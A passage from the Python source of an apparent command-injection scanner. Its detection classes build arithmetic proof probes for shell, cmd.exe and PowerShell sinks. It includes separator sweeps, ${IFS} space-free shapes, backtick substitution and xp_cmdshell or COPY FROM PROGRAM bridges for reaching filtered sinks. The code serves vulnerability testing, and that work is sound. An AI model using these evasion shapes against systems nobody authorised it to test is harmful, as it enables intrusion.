    # pairs — body, application headers, cookie values, the redirect target, the
    # reason phrase, and JSON leaves. Empty means "body only", so an Observation
    # built from a body alone behaves exactly as it did before channels existed.
    channels: List[Tuple[str, str]] = dataclass_field(default_factory=list)
    control_channels: List[Tuple[str, str]] = dataclass_field(default_factory=list)


class DetectionMethod:
    """Base oracle. Subclasses declare a ``name``/``tier``, decide which records
    they apply to, build probes with locally-computed expected values, and turn
    an Observation into a Verdict. Kept deliberately plain (no ABC) so it runs
    unchanged on Python 3.8."""
    name = "base"
    tier = "executed"
    # Which question this method asks, independent of the tier its answer
    # earns. Two methods asking the same question are one finding under two
    # names, so the second is skipped once the first has proven it; two asking
    # different questions are never traded against each other, however
    # thoroughly the other is answered.
    #
    # Declared rather than derived. The tier says how strong an answer this
    # method can reach, and that is a different axis: `time` asks the execution
    # question and cannot reach the strongest answer to it, while `lookup`
    # reaches a definitive answer to a question that is not about execution at
    # all. See :func:`detection_question`.
    question = "execution"
    # Aggregate methods observe a whole *set* of probes together (e.g. a timing
    # regression across several controlled delays) and decide once via
    # confirm_series, instead of one Verdict per probe.
    aggregate = False
    # Tiers this method really emits *below* ``tier``, which is a ceiling rather
    # than its only answer: ``write`` reports ``file-write`` for a file that
    # is served but not interpreted, and ``deser`` reports ``needs-review``
    # for a shape fingerprint.
    # Declared because three separate places had to know it and each kept its
    # own list -- the documentation tests, the benchmark's expectation
    # whitelist, and the advice printed after a clean in-band run.
    also_reports: Tuple[str, ...] = ()
    # The ``--verify-active-risk`` rung this method needs. The payload corpus
    # has labelled its records this way from the start and the query-language
    # bridges followed; detection methods did not, so each risky one was gated
    # by hand in ``main()``. A new method meant remembering to add a branch
    # there, and a probe shape with no rung to sit at was simply deleted.
    safety = "safe"
    # Whether the method needs somewhere for the target to call back to --
    # that is, whether the run should stop when no `--oob-host` is named.
    # Another list that was written out by hand at the one place that checked
    # it.
    needs_oob_host = False
    # Whether the method builds probes that call back *when* a host is named,
    # which is what decides that a listener has to be running. The two were one
    # attribute, and `deser` is where they come apart: it is the only method
    # that answers no to the first and yes to the second, because its shape
    # oracle proves something without any listener at all. Reading the gate off
    # `needs_oob_host` therefore started no listener for a `deser`-only run and
    # sent its gadgets to a target with nothing to receive the callback.
    # Declared rather than derived: `needs_oob_host or oob_needs_dns_label`
    # happens to give the right answer today and would miss a method that calls
    # back over HTTP without requiring a host, which is exactly the shape `oob`
    # would have if its host were optional.
    #
    # This is the default answer, not the answer. Ask `builds_callback_probes`.
    uses_oob_host = False
    # Whether the token can only ride in a DNS label, which decides what an
    # address literal for `--oob-host` is worth to this method. `oob` has a
    # second channel -- it puts the token in a URL path and drops its DNS
    # shapes -- so an address serves it. A lookup expression and a serialized
    # gadget have no such channel: they resolve a name or nothing. Declared
    # here rather than tested at the one place that cared, because that is how
    # `deser` came to send a gadget aimed at `<token>.10.0.0.9` while the
    # warning that exists for a dead DNS channel stayed silent.
    oob_needs_dns_label = False
    def builds_callback_probes(self) -> bool:
        """Whether this method, configured *this* way, builds probes that rest
        on a callback -- given a host it can actually use.

        Deliberately not a question about the host's form. Two callers need
        different things from it: the listener gate asks whether anything in
        this run will call back, and the stranded notice asks whether an
        address took away something the method would otherwise have had. Both
        want capability-as-configured, and folding the address test in here
        would make the second one answer no for exactly the case it exists to
        report.

        A class attribute cannot answer this for every method. `deser` selects
        ecosystems with `--deser-formats`, and three of the five ship no DNS
        gadget at all -- so whether it calls back is a property of the run, not
        of the class, and the attribute was blaming an address for a limit that
        belonged to the format."""
        return self.uses_oob_host

    def can_use_oob_host(self) -> bool:
        """Whether the host, as the operator wrote it, is one this method can
        put a token in.

        The other half of the question, and separate because the two callers
        compose them differently. The stranded notice wants capability alone --
        it is *about* the address, and an address test inside
        :meth:`builds_callback_probes` would silence it for exactly the case it
        reports. The listener gate wants both: a listener bound for a method
        that cannot use the host receives nothing, and the run then announced
        "the target will open outbound connections" directly beneath a notice
        saying those probes are not sent."""
        host = str(self.config.get("oob_host") or "").strip().rstrip(".")
        if not host:
            return False
        return not (self.oob_needs_dns_label and OobCallback._is_ip_literal(host))

    # Whether the operator's own configuration is this method's gate, in place
    # of the rung. `file` and `write` change the target and say so in `safety`,
    # but they do nothing at all until a directory to write into and a URL to
    # read it back from are named -- which is a narrower statement of intent
    # than a risk tier. Demanding the flag as well would refuse a command that
    # works today, and when the configuration is missing the run has something
    # more useful to say than which tier to raise.
    gated_by_config = False
    # Whether one probe of this method buys an answer, or whether an answer
    # costs more than one: a real sleep, a wait for a callback, a second fetch
    # to read the result back -- or a whole series before anything can be
    # decided. The enumeration driver runs the cheap methods first for that
    # reason, and asks the class rather than consulting a list of names --
    # every hand-written list naming methods in this repository has gone stale,
    # and this one had `lookup` and `deser` on the expensive side, where being
    # skipped cost findings rather than requests.
    #
    # It was written as "does one probe cost more than one response", which was
    # the same question while every method's probe was also its unit of
    # information. `boolean` is the first where the two come apart -- each of
    # its probes is one ordinary request, and none of them means anything until
    # the series is complete -- so the wording follows what the driver uses it
    # for rather than what happened to be equivalent.
    costly = False
    @classmethod
    def decides_per_probe(cls) -> bool:
        """Whether each probe carries its own verdict, or only the series does.

        Asked of the class rather than kept as a list of names, because the
        answer already lives in the class: a method that overrides
        :meth:`confirm_each` has a per-probe answer to give, and one that does
        not can only speak once the batch is complete. Every hand-written list
        naming methods in this repository has gone stale.

        It decides what a budget may do to a series. Where each probe answers,
        stopping early costs the probes not sent and nothing else. Where only
        the series answers, stopping early does not produce a weaker verdict --
        it produces a wrong one: a timing regression fitted to half its levels,
        or a boolean series whose anchors never went out, which reads as
        `negative` and is a false clean."""
        return cls.confirm_each is not DetectionMethod.confirm_each

    def __init__(self, gen: "RCEKit", config: Optional[Dict[str, Any]] = None):
        self.gen = gen
        self.config = config or {}

    def probe_safety(self, probe: "Probe") -> str:
        """The rung one probe needs: its own, or the method's.

        A method is not always one rung. ``lookup`` resolves a name at
        ``intrusive`` and can fetch from an address it did not choose at
        ``stateful``, and the difference is per shape rather than per method."""
        return probe.safety or self.safety

    def applicable(self, record: "PayloadRecord") -> bool:
        raise NotImplementedError

    def build_probes(self, record: "PayloadRecord", rng: "random.Random") -> List[Probe]:
        raise NotImplementedError

    def confirm(self, obs: "Observation", probe: "Probe") -> Verdict:
        raise NotImplementedError

    def confirm_series(self, series: "List[Tuple[Probe, Observation]]") -> Verdict:
        """Decide from all of this method's probe observations at once. Only
        called for methods with ``aggregate = True``."""
        raise NotImplementedError

    def confirm_each(self, series: "List[Tuple[Probe, Observation]]"
                     ) -> "Optional[List[Tuple[Probe, Verdict]]]":
        """Optional per-probe verdicts for an ``aggregate`` method.

        Some methods must observe the whole batch before judging *any* probe —
        an out-of-band callback can land long after the response that triggered
        it — yet still have a per-probe answer to give, because each probe
        carries its own token. Returning a list here makes the engine emit one
        result per probe instead of a single series verdict, so the report names
        the exact payload that worked rather than an arbitrary one. Returning
        ``None`` (the default) keeps the single-verdict behaviour."""
        return None

    def next_probes(self, series: "List[Tuple[Probe, Observation]]") -> List[Probe]:
        """Probes to fire after seeing ``series``, or ``[]`` when done.

        Lets an aggregate method screen cheaply before committing to an
        expensive measurement: a timing regression costs a sleep per probe, so
        finding *which* separator breaks out with one quick probe each beats
        running the full regression through every candidate."""
        return []

    def _depth(self) -> str:
        """``quick`` (canonical probes only) or ``full`` (the extended
        vocabulary as well). Extra probe shapes buy coverage on filtered sinks
        at the cost of more requests, so the operator can trade one for the
        other."""
        return self.config.get("probe_depth") or "full"

    def _profile_rejects(self, payload: str) -> Optional[str]:
        """Why the operator's declared target profile says this probe cannot
        reach the sink, or ``None`` when nothing rules it out.

        ``--deny-chars`` / ``--max-length`` (and their ``--target-profile``
        equivalents) describe a filter the tester has already measured by hand.
        They reached :meth:`RCEKit._filter_by_profile`, which drops *corpus
        records* -- and stopped there, so the probes a detection method builds
        from those records were sent regardless. An operator who had stated
        "this target strips quotes" still paid for every quote-carrying rung of
        the ladder, on requests structurally unable to confirm. Those requests
        are not free: they are the budget the next injection point needed.

        Checked on ``probe.payload`` -- the literal form, after the context wrap
        and before the delivery layer percent-encodes it for its injection
        point. That is deliberately stricter than the record check, which is
        applied to the *encoded* payload and so lets a URL-encoded quote through
        a quote filter. The two readings differ because the layers do: transport
        encoding is undone by the server before the value reaches the sink, so a
        percent-encoded quote is still a quote by the time the application's own
        filter sees it."""
        max_length = self.config.get("max_length")
        if max_length and len(payload) > max_length:
            return f"longer than --max-length {max_length}"
        denied = self.config.get("deny_chars") or ""
        present = sorted({char for char in denied if char in payload})
        if present:
            return "contains " + ", ".join(repr(char) for char in present)
        return None

    def filter_probes(self, probes: "List[Probe]") -> "Tuple[List[Probe], List[str]]":
        """``(probes the declared profile allows, one reason per probe dropped)``.

        The single gate every probe passes through. Deliberately *not* inside
        :meth:`_wrap_variants`: ``_space_free_probes``, ``_bridge_variants``,
        :class:`OobCallback`, :class:`EvalExpr` and :class:`DeserSink` each call
        ``_wrap_context`` directly, so filtering there would reach some methods
        and not others -- the same side path that once left ``file``, ``time``
        and ``oob`` unable to send the raw rung."""
        kept: "List[Probe]" = []
        reasons: List[str] = []
        for probe in probes:
            reason = self._profile_rejects(probe.payload)
            if reason is None:
                kept.append(probe)
            else:
                reasons.append(reason)
        return kept, reasons

    def _search(self, literal: str, body: str, boundary: bool = False) -> bool:
        """Encoded-aware literal search. Reuse the generator's ``_encoded_search``
        (additive: raw body first, then common output wrappers) so a sink that
        base64/hex/url/html-encodes the output still confirms. ``literal`` is
        matched verbatim, not as a regex. With ``boundary=True`` the match is
        fenced by non-digit boundaries, so a bare number (e.g. an arithmetic
        product) does not spuriously match inside a longer digit run."""
        if not literal or not body:
            return False
        pattern = re.escape(literal)
        if boundary:
            pattern = r"(?<!\d)" + pattern + r"(?!\d)"
        return self.gen._encoded_search(pattern, body)

    def _channels_of(self, body: str,
                     channels: List[Tuple[str, str]]) -> List[Tuple[str, str]]:
        """The channels to search, falling back to the body when a caller built
        the Observation from a body alone."""
        return channels if channels else ([("response body", body)] if body else [])

    def _search_channels(self, literal: str, channels: List[Tuple[str, str]],
                         boundary: bool = False) -> Optional[str]:
        """The name of the first channel carrying ``literal``, or ``None``.

        Same encoded-aware, optionally digit-fenced match as :meth:`_search`,
        applied across the whole response rather than the body alone."""
        for name, text in channels:
            if self._search(literal, text, boundary=boundary):
                return name
        return None

    def _confirm_computed(self, obs: "Observation", probe: "Probe",
                          noun: str = "computed value", boundary: bool = False) -> Verdict:
        """Shared confirmation for methods that make the target compute a value on
        random inputs. The value RCEKit computed must be present in the response
        and absent from the payload-free control — reflection cannot produce it
        (a tag-bracketed sum / a boundary-fenced product on random operands is
        unforgeable), so its presence is proof of execution.

        A ``forbidden`` literal (the pre-execution expression, e.g. ``$((a+b))``)
        may also appear when the target echoes the payload verbatim — the single
        most common command-injection pattern (``PING <input> ...``). That is NOT
        a reason to withhold confirmation: the computed value is already proof, so
        the reflected literal is only noted, never a downgrade.

        The value is looked for across every channel of the response, not the
        body alone, and the matching channel is named in the evidence so the
        finding stays reproducible by hand. The control differential is applied
        across every channel of the control too — deliberately stricter than
        comparing only the channel that matched, because a payload-free response
        that already contains the expected value means the value is not
        attributable to execution no matter where it turned up."""
        if obs.status is None:
            return Verdict("error", f"request never reached the target ({obs.body[:120]})")
        channels = self._channels_of(obs.body, obs.channels)
        where = self._search_channels(probe.expected, channels, boundary=boundary)
        if where is None:
            return Verdict("negative", f"{noun} absent from the response")
        control = self._channels_of(obs.control_body, obs.control_channels)
        control_where = self._search_channels(probe.expected, control, boundary=boundary)
        if control_where is not None:
            detail = "" if control_where == "response body" else f" ({control_where})"
            return Verdict("inconclusive", f"{noun} also present in the payload-free control{detail}")
        channel_note = "" if where == "response body" else f" in {where}"
        carrier_note = f" via the {probe.carrier} carrier" if probe.carrier else ""
        evidence = (f"target computed {probe.expected!r}{channel_note}{carrier_note} "
                    "(random operands, absent from control)")
        if probe.forbidden and self._search_channels(probe.forbidden, channels):
            evidence += "; target also reflects the payload verbatim"
        return Verdict("executed", evidence)

    def _tag(self, rng: "random.Random") -> str:
        """A distinctive letters-only boundary marker. Letters keep it from
        blurring into an adjacent digit run (e.g. an arithmetic result)."""
        return "RK" + "".join(rng.choice(string.ascii_uppercase) for _ in range(5))

    # Command separators a probe tries in order to break out of the command it
    # was concatenated into. A sink that strips ';' -- the single most common
    # partial mitigation in the wild -- is still reachable through a pipe, a
    # chain operator or a newline, so a probe that only ever tries ';' reports
    # a genuinely exploitable target as negative.
    #
    # '||' earns its place next to '&&': the injected input is appended to a
    # command whose exit status is unknown, and only one of the two fires for
    # any given outcome. The newline is a real "\n", not the generator's %0a:
    # the live delivery layer percent-encodes each probe for its injection
    # point, which would turn a literal %0a into %250a and hand the sink the
    # text rather than the line break.
    DEFAULT_SEPARATORS = {
        "unix": ("; ", "| ", "|| ", "&& ", "\n"),
        "windows": (" & ", " | ", " || ", " && "),
        # No pipe: PowerShell's `|` binds the previous command's output to the
        # injected cmdlet's parameters, and every cmdlet these probes use
        # rejects that binding, so the injected command never runs. `;` and the
        # newline work on every version; `&&`/`||` need PowerShell 7.
        "powershell": ("; ", "\n", "&& ", "|| "),
    }

    def _sink_env(self, record: "PayloadRecord") -> str:
        """The shell dialect this carrier's probes are written in."""
        return sink_env_for(record, self.config)

    def _separators(self, sink_env: str = "unix") -> Tuple[str, ...]:
        """The separators to sweep.

        ``--separators`` is the explicit, lowest-level control and still wins
        outright. Otherwise ``--sink-shape`` narrows the sweep to the separators
        of the rungs it named — and if it named none of them (say
        ``--sink-shape sq``), the sweep is empty on purpose: the only shapes
        left are ones that supply their own way into the shell, so a
        separator-led probe would be a request that cannot confirm.

        Each dialect keeps its own table. Their separators are genuinely
        different — cmd.exe takes ``&`` and not ``;``, PowerShell takes ``;``
        and not a pipe — so a rung name maps to the dialect's own vocabulary
        rather than to a global one."""
        configured = self.config.get("separators")
        if configured:
            return tuple(configured)
        table = self.DEFAULT_SEPARATORS.get(sink_env, self.DEFAULT_SEPARATORS["unix"])
        shapes = self.config.get("sink_shapes")
        if not shapes:
            return table
        rungs = SINK_SHAPE_SEPARATORS_BY_ENV.get(sink_env, SINK_SHAPE_SEPARATORS)
        selected: List[str] = []
        for rung in SINK_SHAPE_RUNGS:
            if rung in shapes:
                selected.extend(rungs.get(rung, ()))
        return tuple(dict.fromkeys(selected))

    def _needs_separator(self, record: "PayloadRecord") -> bool:
        """Whether a probe for this record must supply its own separator.

        Three cases must not get one. With ``--sink-raw`` the injected input is
        executed as the *whole* command (a ``qx/$input/``-style sink with no
        surrounding command to break out of), so a leading ``;`` is a syntax
        error. A shell-quoted context's prefix already ends in one, so
        adding another produced ``'; ; cmd`` -- the generator has guarded that
        since it was found there; the detection engine had not, which made the
        one context genuinely fitting a quoted sink the one that could not
        confirm on it.

        A substitution context is the third, and it is not the second in
        disguise: ``$(cmd)`` and ``` `cmd` ``` never break out of the running
        command, they *are* an expression the shell evaluates where it sits. A
        leading ``;`` would put a syntax error inside the substitution."""
        return not (self.config.get("sink_raw")
                    or record.context in NO_SEPARATOR_CONTEXTS)

    def _raw_rung_selected(self) -> bool:
        """Whether the bare, separator-free body should also be sent.

        Part of the ladder rather than a mode: ``--sink-raw`` makes the raw
        shape the *only* one tried (a deliberate narrowing, unchanged), while
        the ladder sends it *alongside* the separator sweep so a whole-command
        sink is found without the operator having guessed its shape first."""
        if self.config.get("sink_raw"):
            return False  # already the only body; see _needs_separator
        return "raw" in effective_sink_shapes(self.config)

    def _separator_candidates(self, record: "PayloadRecord",
                              sink_env: str = "unix") -> Tuple[Optional[str], ...]:
        """The separators to build one probe each for; ``None`` means "none".

        Every method that builds a probe per separator goes through here, which
        is the point. The raw rung used to live only in ``_wrap_variants``, so
        it reached ``reflected`` and nothing else: ``file``, ``time`` and ``oob``
        read the separator list directly and so never sent a bare command to a
        whole-command sink. Worse, narrowing those methods to ``--sink-shape
        raw`` left them with an empty separator list and *zero probes*, and an
        aggregate method with no samples reported ``negative`` -- a run that
        tested nothing reading as "not vulnerable"."""
        if not self._needs_separator(record):
            return (None,)
        candidates: List[Optional[str]] = list(self._separators(sink_env))
        if self._raw_rung_selected():
            candidates.append(None)
        return tuple(candidates)

    def _wrap_variants(self, record: "PayloadRecord", core: str, sink_env: str = "unix",
                       evade: bool = True, terminate: bool = False) -> List[str]:
        """One ready-to-send payload per candidate separator: break out of the
        running command, then escape for the record's serialization context —
        reusing the same context/escape machinery the generator uses for every
        other payload. Returns a single bare-command payload where no separator
        applies (see :meth:`_needs_separator`).

        ``evade=False`` marks a body no rung may be applied to on retry:
        ``${IFS}`` around a redirect (``>``) yields an ambiguous redirect, so
        those shapes stay canonical however hard a filter refuses them."""
        if terminate:
            # A trailing '#' comments out whatever the application appends after
            # the injection point. That suffix is not exotic: `ping <input> -w 5`,
            # `convert <input> out.png` and `<cmd> <input> 2>/dev/null` all bolt
            # something on, and a redirect or a pipe there swallows the probe's
            # output entirely -- the probe executes and still reads as negative.
            #
            # cmd.exe has no '#' comment, so the shape is skipped there; a
            # PowerShell sink does take it ('#' comments to end of line in
            # PowerShell too -- measured). A context that closes with its own
            # suffix would put the suffix after the '#' and comment it out
            # instead, so it is skipped in every dialect.
            ctx = self.gen.contexts.get(record.context, {})
            if sink_env == "windows" or ctx.get("suffix"):
                return []
            core = f"{core} #"
        # One body per candidate, where a `None` candidate is the `raw` rung:
        # the sink runs the injected value as the whole command, so the bare
        # core is the probe. It used to need --sink-raw, which meant a
        # qx/$input/-style sink reported clean unless the operator already
        # suspected its shape -- a false negative that took prior knowledge to
        # avoid.
        bodies = [core if separator is None else f"{separator}{core}"
                  for separator in self._separator_candidates(record, sink_env)]
        payloads: List[str] = []
        for body in bodies:
            # No transform here any more. Applying a rung to every probe was
            # measured shape by shape against an unfiltered target: it broke 8
            # shapes the canonical form executes and improved none. The rung is
            # now a retry for a probe a filter actually refused, so its cost is
            # paid where it buys something and nowhere else.
            if self._context_swallows(record, body):
                continue
            payloads.append(self._wrap_context(record, body))
        return payloads

    def _selected_bridges(self, sink_env: str) -> List[Tuple[str, Dict[str, Any]]]:
        """``(name, bridge)`` for each selected bridge this dialect can carry.

        A bridge declares the shell it reaches -- ``xp_cmdshell`` hands its
        argument to cmd.exe, ``COPY FROM PROGRAM`` to /bin/sh -- so a bridge is
        only offered a core written in its own dialect. Pairing them the other
        way would send a POSIX ``$((a+b))`` into cmd.exe, which is precisely the
        inert-text failure the dialect split exists to stop.

        An unknown name is refused rather than dropped: narrowing a run to
        nothing because of a typo would report a clean negative from a run that
        rode no bridge at all."""
        wanted = self.config.get("bridges") or ()
        if not wanted:
            return []
        declared: Dict[str, Any] = getattr(self.gen, "bridges", None) or {}
        if wanted == ("auto",):
            names = list(declared)
        else:
            unknown = [name for name in wanted if name not in declared]
            if unknown:
                raise ValueError(f"unknown bridge(s): {', '.join(unknown)}; "
                                 f"choose from auto, {', '.join(sorted(declared))}")
            names = [name for name in wanted]
        allowed = self.config.get("max_safety") or "intrusive"
        out: List[Tuple[str, Dict[str, Any]]] = []
        for name in names:
            bridge = declared[name]
            if (bridge.get("sink_env") or "unix") != sink_env:
                continue
            # A bridge that creates an object on the target is held to the same
            # safety ordering as every stateful payload in the corpus, rather
            # than riding in because a detection method built it.
            if SAFETY_ORDER.get(bridge.get("safety") or "intrusive", 1) > SAFETY_ORDER.get(allowed, 1):
                continue
            out.append((name, bridge))
        return out

    def _bridge_variants(self, record: "PayloadRecord", core: str, sink_env: str,
                         rng: "random.Random") -> List[Tuple[str, str, Optional[str]]]:
        """``(bridge_name, payload, cleanup)`` for each selected bridge.

        No separator: inside ``COPY … FROM PROGRAM '…'`` or ``xp_cmdshell '…'``
        there is no running command to break out of, so the bare core is the
        probe -- the raw rung, arrived at structurally rather than by flag.

        The context still applies. A bridge supplies the query-language
        structure; the record's context supplies the break-out into the query,
        which is what makes ``--contexts sql`` and a bridge compose instead of
        each reinventing the other."""
        out: List[Tuple[str, str, Optional[str]]] = []
        for name, bridge in self._selected_bridges(sink_env):
            token = "".join(rng.choice(string.ascii_lowercase) for _ in range(8))
            body = str(bridge.get("template", "")).replace("__CMD__", core)
            body = body.replace("{token}", token)
            if self._context_swallows(record, body):
                continue
            cleanup = bridge.get("cleanup")
            cleanup = str(cleanup).replace("{token}", token) if cleanup else None
            out.append((name, self._wrap_context(record, body), cleanup))
        return out

    def _wrap(self, record: "PayloadRecord", core: str, sink_env: str = "unix",
              evade: bool = True) -> str:
        """The first :meth:`_wrap_variants` payload — one separator only.

        For methods that cannot sweep: an aggregate method reads a whole probe
        series as one measurement, so mixing separators through it would blend
        a working break-out with broken ones and destroy the signal."""
        return self._wrap_variants(record, core, sink_env, evade)[0]

    def _space_free_bodies(self, record: "PayloadRecord",
                           core: str) -> List[Tuple[Optional[str], str]]:
        """``(separator, body)`` pairs that contain no literal space at all.

        The default separators carry a trailing space (``"; "``), which would
        reintroduce the very character a space-stripping sink removes, so they
        are trimmed here — no shell needs the space after ``;`` or ``&&``. The
        newline separator is kept as-is: it is not a space, and a sink that
        strips spaces still passes it through."""
        pairs: List[Tuple[Optional[str], str]] = []
        for separator in self._separator_candidates(record, "unix"):
            if separator is None:
                # The raw rung. A space-filtering sink can also be a
                # whole-command sink; the two filters are unrelated.
                pairs.append((None, core))
                continue
            trimmed = separator if separator == "\n" else separator.strip()
            if " " in trimmed:
                continue
            pairs.append((separator, f"{trimmed}{core}"))
        return pairs

    def _context_swallows(self, record: "PayloadRecord", body: str) -> bool:
        """Whether this context would break ``body`` rather than carry it.

        A context that opens *and* closes with the same quote puts the payload
        **inside** that quote — ``attribute`` wraps it in ``"``. A probe whose
        body also contains that quote closes it early and the rest is no longer
        a command, so the probe is structurally unable to execute: it costs a
        request and can only ever come back negative. Measured on a verbose
        shell sink, the ``awk`` shape confirmed 8 times in ``raw`` and 0 times
        in ``attribute``, while the quote-free shapes confirmed in both.

        A break-out context is the opposite case and must not be caught here:
        ``shell_double_quoted`` (``"; `` … `` #``) *closes* the sink's quote and
        comments out its tail, so quotes in the body are fine — verified.

        The backtick substitution context is the same failure through a
        different character: ``` `...` ``` does not nest, so a probe whose body
        carries its own backtick (the ``expr`` shape does) closes the outer
        substitution early and the remainder is no longer a command. ``$( )``
        *does* nest, so the subshell context carries every shape and is
        deliberately not caught here.

        Only for contexts that pass the body through verbatim. Where an escape
        rule applies, the quote is the serialization layer's, and what the sink
        finally sees depends on the parser in between."""
        ctx = self.gen.contexts.get(record.context, {})
        prefix, suffix = ctx.get("prefix", ""), ctx.get("suffix", "")
        if ctx.get("escape", "none") != "none":
            return False
        if prefix and prefix == suffix and prefix in ('"', "'", "`"):
            return prefix in body
        return False

    def _wrap_context(self, record: "PayloadRecord", body: str) -> str:
        """Escape ``body`` for the record's serialization context and apply the
        context break-out prefix/suffix — the same machinery the generator uses
        for every other payload. No command separator is added."""
        ctx = self.gen.contexts.get(record.context, {"prefix": "", "suffix": "", "escape": "none"})
        escaped = self.gen._escape_for_context(body, ctx.get("escape", "none"))
        return f"{ctx.get('prefix', '')}{escaped}{ctx.get('suffix', '')}"


class ReflectedMath(DetectionMethod):
    """Results-based confirmation (highest value). Force the target's shell to
    compute an arithmetic value on random operands and collapse a nested
    substitution, then confirm that value appears in the response and NOT in a
    payload-free control.

    Reflection cannot fake it: a target that merely echoes the payload returns
    the literal ``$((a+b))``, never the sum. Two independent proofs ride in one
    Unix probe — (1) arithmetic on random operands, and (2) a ``$(echo TAG)``
    substitution collapse that proves the shell *ran* the substitution rather
    than echoing it.

    The core is written in the carrier's own dialect (see :func:`sink_env_for`).
    ``$(( ))`` is POSIX syntax and inert text on Windows, so cmd.exe gets
    ``set /a`` through a ``for /f`` capture and PowerShell gets its ``$( )``
    subexpression — otherwise the two OS families the corpus generates payloads
    for are families this method cannot confirm on.

    Every probe's expected value brackets the computed result in random tags,
    and that is a *class* guarantee rather than a presentation detail. This
    method's finding prints as ``[reflected/<environment>/...]`` under
    EXECUTED, which asserts a shell of that family ran the input — so an
    expected value the sum alone satisfies would let anything that evaluates
    arithmetic earn a shell's name. See :meth:`_extended_probes` for the shape
    that did exactly that, and what it was measured against."""
    name = "reflected"
    tier = "executed"

    def applicable(self, record: "PayloadRecord") -> bool:
        return record.environment in SHELL_CAPABLE_ENVIRONMENTS

    def build_probes(self, record: "PayloadRecord", rng: "random.Random") -> List[Probe]:
        a = rng.randint(100000, 999999)
        b = rng.randint(100000, 999999)
        total = a + b
        t1, t2, t3 = self._tag(rng), self._tag(rng), self._tag(rng)
        probes: List[Probe] = []
        sink_env = self._sink_env(record)
        if sink_env == "windows":
            # `set /a` is cmd.exe's arithmetic builtin; `for /f` captures its
            # output so the computed value lands in the response.
            arith = f"set /a {a}+{b}"
            core = f'for /f "delims=" %i in (\'{arith}\') do @echo {t1}%i{t2}'
            probes.extend(Probe(payload=payload, expected=f"{t1}{total}{t2}", forbidden=arith)
                          for payload in self._wrap_variants(record, core, "windows"))
        elif sink_env == "powershell":
            # `$( )` is PowerShell's subexpression operator, and an unquoted
            # argument is an expandable string -- so `RK1$(a*b)RK2` is one
            # bareword that comes back with the product spliced in, with no
            # quote character anywhere in the probe. That matters: a quote in
            # the body is what stops the quote-wrapping contexts from carrying a
            # shape at all (see _context_swallows).
            #
            # A product rather than a sum, and multiplied locally: reflection
            # returns the literal `$(a*b)`, never the 11-digit product.
            product = a * b
            expr = f"$({a}*{b})"
            core = f"Write-Output {t1}{expr}{t2}"
            probes.extend(Probe(payload=payload, expected=f"{t1}{product}{t2}", forbidden=expr)
                          for payload in self._wrap_variants(record, core, "powershell"))
            if self._depth() != "quick":
                # Same proof with the sink's tail commented out, and without
                # naming a cmdlet at all: a bare expandable string is a
                # statement whose value PowerShell writes to the output stream,
                # so it survives a filter on `Write-Output`/`echo`.
                probes.extend(
                    Probe(payload=payload, expected=f"{t1}{product}{t2}", forbidden=expr)
                    for payload in self._wrap_variants(record, core, "powershell",
                                                       terminate=True))
                bare = f'"{t1}{expr}{t2}"'
                probes.extend(
                    Probe(payload=payload, expected=f"{t1}{product}{t2}", forbidden=expr)
                    for payload in self._wrap_variants(record, bare, "powershell"))
        else:
            # $(( )) arithmetic + $() substitution collapse, one probe.
            arith = f"$(({a}+{b}))"
            core = f"echo {t1}{arith}{t2}$(echo {t3}){t1}"
            probes.extend(Probe(payload=payload, expected=f"{t1}{total}{t2}{t3}{t1}",
                                forbidden=arith)
                          for payload in self._wrap_variants(record, core))
            # Backtick variant: same proof via a different substitution syntax,
            # so a sink that strips `$(` is still reached.
            bt = f"`expr {a} + {b}`"
            core_bt = f"echo {t1}{bt}{t2}"
            probes.extend(Probe(payload=payload, expected=f"{t1}{total}{t2}", forbidden=bt)
                          for payload in self._wrap_variants(record, core_bt))
            probes.extend(self._space_free_probes(record, a, b, total, t1, t2))
            if self._depth() != "quick":
                probes.extend(self._extended_probes(record, a, b, total, t1, t2, t3, core))
        probes.extend(self._bridge_probes(record, sink_env, rng, a, b, total, t1, t2))
        return probes

    def _bridge_probes(self, record: "PayloadRecord", sink_env: str, rng: "random.Random",
                       a: int, b: int, total: int, t1: str, t2: str) -> List[Probe]:
        """The arithmetic core carried into the OS through a query language.

        Worth stating plainly: this is the weakest of the three oracles a bridge
        can ride, because it needs the *output* of the program to reach the
        response, and a statement injected alongside the application's own query
        returns through a cursor the application never reads. It ships because
        it costs one request and some drivers do return the last result set --
        but `time` and `oob` are the bridge oracles that work with nothing
        rendered, and the docs say so rather than leaving it to be discovered."""
        core = (f"echo {t1}$(({a}+{b})){t2}" if sink_env != "windows"
                else f'for /f "delims=" %i in (\'set /a {a}+{b}\') do @echo {t1}%i{t2}')
        probes: List[Probe] = []
        for name, payload, cleanup in self._bridge_variants(record, core, sink_env, rng):
            probes.append(Probe(payload=payload, expected=f"{t1}{total}{t2}",
                                forbidden=f"{a}+{b}", carrier=name, separator=None,
                                followup={"cleanup": cleanup} if cleanup else None))
        return probes

    def _space_free_probes(self, record: "PayloadRecord", a: int, b: int, total: int,
                           t1: str, t2: str) -> List[Probe]:
        """The same arithmetic proof with no literal space anywhere in it.

        Stripping spaces is a filter of the same family as stripping ``;`` — it
        looks like it disarms command injection and does not, because ``${IFS}``
        is a space as far as the shell is concerned. Every other probe carries a
        space, so this one filter silenced all of them and a target exploitable
        by anyone who has met it reported clean.

        Sent at both probe depths: it is one shape, and leaving a whole filter
        class undetectable is not the kind of saving ``--probe-depth quick`` is
        for. It is a probe shape in its own right rather than a rung, so it is
        always offered -- the rungs are retries now and do not stand in for
        it."""
        core = f"echo${{IFS}}{t1}$(({a}+{b})){t2}"
        return [Probe(payload=self._wrap_context(record, body), expected=f"{t1}{total}{t2}",
                      forbidden=f"$(({a}+{b}))", separator=separator)
                for separator, body in self._space_free_bodies(record, core)]

    def _extended_probes(self, record: "PayloadRecord", a: int, b: int, total: int,
                         t1: str, t2: str, t3: str, core: str) -> List[Probe]:
        """Probe shapes for sinks the two canonical ones cannot reach.

        Both canonical probes route the arithmetic through a command
        substitution — ``$((...))`` and a backtick — and both spell the command
        ``echo``/``expr``. That is two blind spots at once, and each is a filter
        seen in the wild:

        * a sink that strips ``$(`` blocks ``$((`` too (it is a prefix of it) and
          also blocks the backtick, so a target exploitable through a plain
          ``;`` reports clean. ``awk`` prints the result straight to stdout,
          needing no substitution at all.
        * a keyword filter on ``echo``/``expr``/``cat``/``id`` blocks both, while
          ``awk`` is not in anyone's blocklist.

        There used to be a third shape here -- a bare ``expr a + b``, whose
        expected value was the sum alone, matched digit-fenced -- and it is gone
        because an untagged sum cannot tell a shell from anything else that does
        arithmetic. Measured against a plain Gremlin endpoint: Groovy reads
        ``expr 548286 + 675041`` as the command expression ``expr(548286 +
